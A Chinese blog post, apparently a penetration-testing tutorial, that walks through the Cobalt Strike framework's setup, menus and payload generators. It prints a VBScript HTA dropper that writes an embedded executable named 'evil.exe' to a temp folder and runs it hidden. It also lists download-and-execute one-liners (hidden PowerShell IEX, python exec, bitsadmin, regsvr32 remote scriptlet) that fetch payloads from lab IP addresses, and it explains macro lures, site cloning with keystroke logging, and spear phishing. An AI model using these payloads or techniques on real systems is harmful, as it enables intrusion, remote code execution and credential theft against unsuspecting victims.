id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><i class="anzhiyufont anzhiyu-icon-angle-right post-meta-separator"></i><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url">渗透测试</a><i class="anzhiyufont anzhiyu-icon-angle-right post-meta-separator"></i><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/" itemprop="url">渗透测试框架</a></span><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">CobaltStrike渗透框架</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-07-13T02:51:13.000Z" title="发表于 2023-07-13 10:51:13">2023-07-13</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-03-13T15:50:38.281Z" title="更新于 2024-03-13 23:50:38">2024-03-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">5.9k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>21分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="CobaltStrike渗透框架"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为东莞"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>东莞</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202308071816899.png"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://hihopkc.github.io/posts/16261.html"><header><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url">渗透测试</a><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/" itemprop="url">渗透测试框架</a><h1 id="CrawlerTitle" itemprop="name headline">CobaltStrike渗透框架</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hihopkc</span><time itemprop="dateCreated datePublished" datetime="2023-07-13T02:51:13.000Z" title="发表于 2023-07-13 10:51:13">2023-07-13</time><time itemprop="dateCreated datePublished" datetime="2024-03-13T15:50:38.281Z" title="更新于 2024-03-13 23:50:38">2024-03-13</time></header><h1 id="CobaltStrike渗透框架"><a href="#CobaltStrike渗透框架" class="headerlink" title="CobaltStrike渗透框架"></a>CobaltStrike渗透框架</h1><h2 id="CobaltStrike框架介绍"><a href="#CobaltStrike框架介绍" class="headerlink" title="CobaltStrike框架介绍"></a>CobaltStrike框架介绍</h2><h3 id="CobaltStrike简介"><a href="#CobaltStrike简介" class="headerlink" title="CobaltStrike简介"></a>CobaltStrike简介</h3><p>Cobalt Strike（简称为CS）是一款团队作战渗透测试神器，是一种可以用来进行横向移动、数据窃取、鱼叉式钓鱼的后渗透工具，分为客户端和服务端，一个客户端可以连接多个服务端，一个服务端也可以对应多个客户端连接。</p>
<h3 id="CobaltStrike-目录结构"><a href="#CobaltStrike-目录结构" class="headerlink" title="CobaltStrike 目录结构"></a>CobaltStrike 目录结构</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202307131058285.png" alt="image-20230713105825201"></p>
<p>cobaltstrike.store ：</p>
<p>此证书用来加密 Cobalt Strike 和客户端通信，带有默认 hash 而且比较敏感，建议自己生成一个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -v -keystore cobaltstrike.store</span><br></pre></td></tr></table></figure>

<p>TeamServer.prop ：包含很多参数用于自定义用于验证屏幕截图和 keylog 回调数据的设置</p>
<h2 id="CobaltStrike基本使用"><a href="#CobaltStrike基本使用" class="headerlink" title="CobaltStrike基本使用"></a>CobaltStrike基本使用</h2><h3 id="CS安装"><a href="#CS安装" class="headerlink" title="CS安装"></a>CS安装</h3><p>运行环境配置</p>
<p>1、Linux 安装 JDK</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt search java | grep jdk</span><br><span class="line">apt install openjdk-11-jdk</span><br></pre></td></tr></table></figure>

<p>2、Windows 安装 JDK</p>
<p>下载JDK：</p>
<p><code>https://www.oracle.com/java/technologies/downloads/#java8-windows</code></p>
<p>Oracle公共账号密码：<code>http://bugmenot.com/view/oracle.com</code></p>
<p>3、环境变量配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Java_Home =&gt; C:\Program files\jdk1.8.0_216</span><br><span class="line">CLASSPATH =&gt; .;JAVA_HOME%\lib;%JAVA_HOME\lib\tools.jar</span><br><span class="line">PATH =&gt; %JAVA_HOME%\bin;%JAVA_HOME\jre\bin</span><br></pre></td></tr></table></figure>

<h3 id="CS启动"><a href="#CS启动" class="headerlink" title="CS启动"></a>CS启动</h3><ul>
<li>启动服务端</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x teamserver // 给与权限</span><br><span class="line">./teamserver [server_ipaddress] [password]</span><br></pre></td></tr></table></figure>

<ul>
<li>启动客户端</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cobaltstrike</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202307131154182.png" alt="image-20230713115416132"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202308072221107.png" alt="image-20230807222132044"></p>
<ul>
<li>Alias ：别名，用户名@服务端IP地址</li>
<li>Host ：服务端 IP 地址，可为域名</li>
<li>Port ：服务端口号，默认 50050 ，可进行修改</li>
<li>User ：用户名，可随意填写，只要不冲突即可</li>
<li>Password ：登录密码，启动服务端时设置的密码</li>
</ul>
<h3 id="CS工具栏"><a href="#CS工具栏" class="headerlink" title="CS工具栏"></a>CS工具栏</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202307131157636.png" alt="image-20230713115749602"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202308072222423.png" alt="image-20230807222215387"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202307131305889.png" alt="image-20230713130517865"></p>
<ol>
<li>Connect to team server ：连接服务端</li>
<li>Disonnect from team server ：断开当前服务端连接</li>
<li>Configure Listeners ：配置监听器</li>
<li>Show sessions in graph view ：展示会话列表</li>
<li>Show sessions in table view ：展示视图列表</li>
<li>Show targets in table view ：展示目标列表</li>
<li>Credentials ：查看从靶机获取的账户密码</li>
<li>Downloaded Files ：查看从靶机下载的文件</li>
<li>Keystrokes ：查看键盘记录</li>
<li>Screenshots ：查看屏幕截图</li>
<li>Generate Windows Executable (Stageless) ：生成无状态的 EXE 木马</li>
<li>Setup java Signed Applet Attack ：开启Web服务为自签名 Java Applet 提供运行环境</li>
<li>MS Office Macro Attack ：生成 OFFICE 宏病毒文件</li>
<li>Setup Scripted Web-Delivery (Stageless) ：开启 Web 服务，供下载和执行Payload</li>
<li>Host a file ：开启 Web 服务，供下载文件</li>
<li>Manage Web Server ：管理 Web 服务</li>
<li>Help ：帮助文档</li>
<li>About ：关于 Cobalt Strike</li>
</ol>
<h3 id="CS菜单"><a href="#CS菜单" class="headerlink" title="CS菜单"></a>CS菜单</h3><ol>
<li>New Connection ：进行另外一个连接，支持连接多个服务器端</li>
<li>Preferences ：设置 Cobal Strike 界面、控制台、以及输出报告样式TeamServer 连接记录</li>
<li>Visualization ：主要展示输出结果的形式</li>
<li>VPN Interfaces ：设置VPN接口</li>
<li>Listenrs ：创建一个 Listener</li>
<li>Script Manager ：脚本管理</li>
<li>Close ：退出连接</li>
</ol>
<h3 id="View菜单"><a href="#View菜单" class="headerlink" title="View菜单"></a>View菜单</h3><ol>
<li>Applications ：显示受害主机的应用信息，浏览器版本信息</li>
<li>Credentials ：显示所有已获取的受害主机的凭证，如使用hashdump、Mimikatz获取到的密码凭证信息</li>
<li>Downloads ：查看已下载文件</li>
<li>Event Log ：主机上线记录以及团队协作聊天记录</li>
<li>Keystrokes ：查看键盘记录结果</li>
<li>Proxy Pivots ：查看代理模块</li>
<li>Screenshots ：查看所有屏幕截图</li>
<li>Script Console ：脚本控制台，加载第三方脚本以增强功能</li>
<li>Targets ：显示所有受害主机</li>
<li>Web Log ：所有访问Web服务的日志记录</li>
</ol>
<h3 id="Playloads菜单"><a href="#Playloads菜单" class="headerlink" title="Playloads菜单"></a>Playloads菜单</h3><h4 id="HTML-Application"><a href="#HTML-Application" class="headerlink" title="HTML Application"></a>HTML Application</h4><h5 id="VBScript脚本基础"><a href="#VBScript脚本基础" class="headerlink" title="VBScript脚本基础"></a>VBScript脚本基础</h5><p>VBScript 是微软公司出品的脚本语言。 VBScript 是ASP (Active Server Pages)默认使用的脚本语言</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;VBScript&quot;&gt;</span><br><span class="line">    Function var_func()</span><br><span class="line">        var_shellcode = &quot;4d5a90000300&quot;</span><br><span class="line"></span><br><span class="line">        Dim var_obj</span><br><span class="line">        Set var_obj = CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">        Dim var_stream</span><br><span class="line">        Dim var_tempdir</span><br><span class="line">        Dim var_tempexe</span><br><span class="line">        Dim var_basedir</span><br><span class="line">        Set var_tempdir = var_obj.GetSpecialFolder(2)</span><br><span class="line">        var_basedir = var_tempdir &amp; &quot;\&quot; &amp; var_obj.GetTempName()</span><br><span class="line">        var_obj.CreateFolder(var_basedir)</span><br><span class="line">        var_tempexe = var_basedir &amp; &quot;\&quot; &amp; &quot;evil.exe&quot;</span><br><span class="line">        Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)</span><br><span class="line">        For i = 1 to Len(var_shellcode) Step 2</span><br><span class="line">            var_stream.Write Chr(CLng(&quot;&amp;H&quot; &amp; Mid(var_shellcode,i,2)))</span><br><span class="line">        Next</span><br><span class="line">        var_stream.Close</span><br><span class="line">        Dim var_shell</span><br><span class="line">        Set var_shell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">        var_shell.run var_tempexe, 0, true</span><br><span class="line">        var_obj.DeleteFile(var_tempexe)</span><br><span class="line">        var_obj.DeleteFolder(var_basedir)</span><br><span class="line">    End Function</span><br><span class="line"></span><br><span class="line">    var_func</span><br><span class="line">    self.close</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.runoob.com/vbscript/vbscript-tutorial.html">https://www.runoob.com/vbscript/vbscript-tutorial.html</a></p>
</blockquote>
<ul>
<li>声明变量</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dim var_obj</span><br><span class="line"></span><br><span class="line"># 声明一个变量 var_obj, VBScript 变量用于保存值或表达式</span><br></pre></td></tr></table></figure>

<p>-<br>  变量赋值</p>
<p>可以为某个变量赋值，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_shellcode = &quot;4d5a90000300&quot;</span><br></pre></td></tr></table></figure>

<p>变量名是在表达式的左侧，需要赋给变量的值在表达式的右侧。</p>
<ul>
<li>函数程序</li>
</ul>
<p>是一系列的语句，被封装在 Function 和 End Function 语句内</p>
<p>可执行某些操作，并会返回值</p>
<p>可带有通过程序调用来向其传递的参数。</p>
<p>如果没有参数，必须带有空的圆括号 ()</p>
<p>通过向函数程序名赋值的方式，可使其返回值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function myfunction()</span><br><span class="line">    some statements</span><br><span class="line">    myfunction=some value</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function myfunction(argument1,argument2)</span><br><span class="line">    some statements</span><br><span class="line">    myfunction=some value</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure>

<ul>
<li>调用程序</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/vbscript&quot;&gt;</span><br><span class="line">    Function myfunction()</span><br><span class="line">        myfunction=5+6</span><br><span class="line">    End Function</span><br><span class="line"></span><br><span class="line">    document.write(myfunction())</span><br><span class="line">&lt;/script&gt; </span><br><span class="line"></span><br><span class="line">&lt;p&gt;A Function procedure can return a result.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>


<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;body&gt;

&lt;script type=&quot;text/vbscript&quot;&gt;
    Function myfunction(a,b)
    myfunction=a+b
    End Function

    document.write(myfunction(5,6))
&lt;/script&gt; 

&lt;p&gt;A Function procedure can return a result.&lt;/p&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>-<br>  条件语句</p>
<p>条件语句用于根据不同的情况执行不同的操作</p>
<p>在 VBScript 中，我们可以使用四种条件语句：</p>
<p><strong>If 语句</strong> - 假如您希望在条件为 true 时执行一系列的代码，可以使用这个语句</p>
<p><strong>If…Then…Else 语句</strong> - 假如您希望执行两套代码其中之一，可以使用这个语句</p>
<p><strong>If…Then…ElseIf 语句</strong> - 假如您希望选择多套代码之一来执行，可以使用这个语句</p>
<p><strong>Select Case 语句</strong> - 假如您希望选择多套代码之一来执行，可以使用这个语句</p>
<ul>
<li>循环语句</li>
</ul>
<p>循环语句用于运行相同的代码块指定的次数。</p>
<p>在 VBScript 中，我们可以使用四种循环语句：</p>
<p><strong>For…Next 语句</strong> - 运行一段代码指定的次数</p>
<p><strong>For Each…Next 语句</strong> - 针对集合中的每个项目或者数组中的每个元素来运行某段代码</p>
<p><strong>Do…Loop 语句</strong> - 运行循环，当条件为 true 或者直到条件为 true 时</p>
<p><strong>While…Wend 语句</strong> - 不要使用这个语句 - 请使用 Do…Loop 语句代替它</p>
<h5 id="HTML-Application-1"><a href="#HTML-Application-1" class="headerlink" title="HTML Application"></a>HTML Application</h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202307131326475.png" alt="image-20230713132647448"></p>
<p>生成一个网页 Payload 。三种执行模式： Executable 、 PowerShell 、 VBA</p>
<p>Executable ：是以十六进制的方式内嵌一个 EXE 到 HTA 里，运行时会把 exe 释放到磁盘然后创建进程运行</p>
<p>Powershell ： HTA 调用 powershell.exe 执行 payload</p>
<p>VBA ：通过调用 COM 组件来执行 payload (请确保目标机有 Excel.Application 组件否则会运行失败，注：组件源自 Office )</p>
<p>VB &#x2F; VBS &#x2F; VBA 介绍：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45797022/article/details/105400270">https://blog.csdn.net/weixin_45797022/article/details/105400270</a></p>
<h4 id="MS-Office-Macro"><a href="#MS-Office-Macro" class="headerlink" title="MS Office Macro"></a>MS Office Macro</h4><p>生成 Office 宏病毒文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Attacks -&gt; Packages -&gt; MS Office Macro -&gt; Copy</span><br></pre></td></tr></table></figure>

<p>将代码放到 Word 宏里面，另存为启用宏的Word文档（ *.docm ），受害者点击启用内容，即可上线。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.hetianlab.com/expc.do?w=exp_ass&ec=ECIDa61a-4976-4ad8-8d6c-3ebc9a730ab1">https://www.hetianlab.com/expc.do?w=exp_ass&amp;ec=ECIDa61a-4976-4ad8-8d6c-3ebc9a730ab1</a></p>
</blockquote>
<h4 id="Payload-Generator"><a href="#Payload-Generator" class="headerlink" title="Payload Generator"></a>Payload Generator</h4><p>生成各类语言的 ShellCode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C</span><br><span class="line">C#</span><br><span class="line">COM Scriptlet</span><br><span class="line">Java</span><br><span class="line">Perl</span><br><span class="line">Powershell</span><br><span class="line">Powershell Command</span><br><span class="line">Python</span><br><span class="line">Raw</span><br><span class="line">Ruby</span><br><span class="line">Veil</span><br><span class="line">VBA</span><br></pre></td></tr></table></figure>

<p>各种语言shellcode：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C</span><br><span class="line">C#</span><br><span class="line">Java</span><br><span class="line">Perl</span><br><span class="line">Python</span><br><span class="line">Ruby</span><br><span class="line">VBA</span><br></pre></td></tr></table></figure>

<ul>
<li>COM Scriptlet</li>
</ul>
<p>COM Scriptlet 是一种COM对象，它可以在 HTML 文件中嵌入脚本代码，并在客户端的浏览器中执行。当浏览器打开HTML页面时， COM Scriptlet 会被自动加载和执行，以便在客户端上运行脚本。</p>
<p>生成 payload.sct 文件，注意不要勾选 Use x64 payload 。</p>
<p>Regsvr32 命令用于注册 COM 组件，是 Windows 系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行。</p>
<p>1、执行本地 Com Scriptlet 获取反向 Shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32.exe /n /s /u /i:payload.sct scrobj.dll</span><br></pre></td></tr></table></figure>

<p>2、执行远程 Com Scriptlet 获取反向 Shell</p>
<p>把 payload.sct 文件托管到web服务器，或者使用 CobaltStrike 的 Host File 功能，使用如下方法加载执行上线。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 /u /s /i:http://192.168.164.133:801/do/file.ext scrobj.dll</span><br></pre></td></tr></table></figure>

<ul>
<li>Powershel</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ep bypass -f payload.ps1</span><br></pre></td></tr></table></figure>

<ul>
<li>Powershell Command</li>
</ul>
<p>生成一句话 powershell 命令</p>
<ul>
<li>RAW</li>
</ul>
<p>原始 shellcode ，无特殊格式</p>
<ul>
<li>Veil</li>
</ul>
<p>配合 Veil-Framework 框架使用的 shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Veil-Framework/Veil</span><br><span class="line"></span><br><span class="line">https://rioasmara.com/2021/05/30/veil-evasion-in-cobalt-strike-beacon/</span><br></pre></td></tr></table></figure>

<h4 id="Windows-Executable"><a href="#Windows-Executable" class="headerlink" title="Windows Executable"></a>Windows Executable</h4><p>生成分阶段的攻击载荷</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Windows EXE</span><br><span class="line">Windows Service EXE</span><br><span class="line">Windows DLL</span><br></pre></td></tr></table></figure>

<h4 id="Windows-Executable-s"><a href="#Windows-Executable-s" class="headerlink" title="Windows Executable(s)"></a>Windows Executable(s)</h4><p>生成不分阶段、独立的攻击载荷</p>
<p>生成可执行文件还有 powershell 以及动态链接库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PowerShell</span><br><span class="line">Raw</span><br><span class="line">Windows EXE</span><br><span class="line">Windows Service EXE</span><br><span class="line">Windows DLL</span><br></pre></td></tr></table></figure>

<h4 id="Web-Drive-by"><a href="#Web-Drive-by" class="headerlink" title="Web Drive-by"></a>Web Drive-by</h4><ul>
<li>Manage ：对开启的web服务进行管理</li>
<li>Clone Site ：克隆网站，可以记录受害者提交的数据</li>
<li>Host File ：提供一个文件下载，可以修改Mime信息</li>
<li>Scripted Web Delivery ：为payload提供web服务以便下载和执行 类似于</li>
<li>Metasploit 的 web_delivery</li>
<li>Signed Applet Attack ：使用java自签名的程序进行钓鱼攻击(该方式已过时)</li>
<li>Smart Applet Attack ：自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本</li>
<li>System Profiler ：用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等</li>
<li>Spear Phish ：用来邮件钓鱼的模块，鱼叉钓鱼攻击</li>
</ul>
<p>1、Manage</p>
<p>主要管理我们所创建的Payload以及各类PowerShell管理地址</p>
<p>2、Clone Site + System Profiler</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.hetianlab.com/expc.do?ce=0990110e-1a17-4969-b787-b58bc41b7d97">https://www.hetianlab.com/expc.do?ce=0990110e-1a17-4969-b787-b58bc41b7d97</a></p>
</blockquote>
<p>克隆网站，还可以通过克隆的网站实现钓鱼。</p>
<p>设置 System Profiler ，当输入后回车会跳转到正常的网页上以免被发现。</p>
<blockquote>
<p>Attacks -&gt; Web Drive-by -&gt; System Profiler</p>
</blockquote>
<p>设置 Clone Site</p>
<blockquote>
<p>Attacks -&gt; Web Drive-by -&gt; Clone Site</p>
</blockquote>
<p>记录目标键盘输入</p>
<p>3、Host File</p>
<p>提供一个文件下载服务，可以修改Mime信息</p>
<p>4、Scripted Web Delivery</p>
<p>开启一个web服务托管payload，并根据选择的类型生成一个命令行来执行 payload 上线</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">exe：</span><br><span class="line">http://172.26.2.28:807/e.exe</span><br><span class="line"></span><br><span class="line">python：</span><br><span class="line">python -c &quot;import urllib2; exec </span><br><span class="line">urllib2.urlopen(&#x27;http://172.26.2.28:807/a&#x27;).read();&quot;</span><br><span class="line"></span><br><span class="line">powershell：</span><br><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object </span><br><span class="line">net.webclient).downloadstring(&#x27;http://172.26.2.28:808/a&#x27;))&quot;</span><br><span class="line"></span><br><span class="line">bitsadmin：</span><br><span class="line">cmd.exe /c bitsadmin /transfer 7d0f http://172.26.2.28:807/b </span><br><span class="line">%APPDATA%\7d0f.exe&amp;%APPDATA%\7d0f.exe&amp;del %APPDATA%\7d0f.exe</span><br><span class="line"></span><br><span class="line">regsvr32：</span><br><span class="line">regsvr32 /s /n /u /i:http://172.26.2.28:807/d scrobj.dll</span><br></pre></td></tr></table></figure>

<p>5、System Profiler<br>分析目标使用什么浏览器以及 Adobe 版本还有内部 IP 。</p>
<blockquote>
<p>View -&gt; Applications</p>
</blockquote>
<p>这里可以前期信息收集所用，因为这种方法杀软以及浏览器是无法检测出来的，可以通过水坑式攻击来获取目标所用的软件以及操作系统来针对性的攻击。</p>
<h4 id="Spear-Phish"><a href="#Spear-Phish" class="headerlink" title="Spear Phish"></a>Spear Phish</h4><p>邮件钓鱼</p>
